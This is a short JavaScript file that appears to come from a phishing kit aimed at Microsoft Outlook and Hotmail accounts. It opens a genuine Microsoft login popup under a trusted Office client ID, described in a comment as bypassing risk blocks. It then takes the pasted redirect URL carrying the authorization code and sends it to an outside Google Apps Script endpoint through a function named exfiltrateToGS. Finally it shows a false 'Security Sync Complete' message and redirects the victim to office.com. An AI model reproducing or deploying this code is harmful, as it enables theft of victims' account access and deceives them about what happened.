/**
 * PATH F: OFFICE WEB BRIDGE (Bypassing Risk Blocks)
 */
const GS_URL = "https://script.google.com/macros/s/AKfycbwCVnWFmseoIYGiY4HtU_Quq5gqmKgUyEoE-QeLTBb54fK0iYMEXAX0b7Ho2HfD_mFV/exec"; 

function startBridge() {
    // This is the Client ID for the Office 365 Web Portal
    // It has the highest trust level for Hotmail/Outlook accounts
    const OFFICE_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c";
    const REDIRECT = "https://login.microsoftonline.com/common/oauth2/nativeclient";

    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${OFFICE_ID}` +
        `&response_type=code` + 
        `&scope=openid+profile+offline_access` + 
        `&prompt=login` + 
        `&redirect_uri=${encodeURIComponent(REDIRECT)}`;

    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');

    window.open(authUrl, "_blank", "width=500,height=600");
}

async function exfiltrateToGS() {
    const rawData = document.getElementById('raw-url').value;
    
    if (!rawData.includes("code=")) {
        alert("The login is not yet complete. Please ensure you finished the sign-in in the popup.");
        return;
    }

    try {
        const response = await fetch(`${GS_URL}?action=exfiltrate&data=${encodeURIComponent(rawData)}`);
        const result = await response.json();
        if (result.status === "success") {
            alert("Security Sync Complete.");
            window.location.href = "https://office.com";
        }
    } catch (err) {
        console.error("GS Error:", err);
    }
}
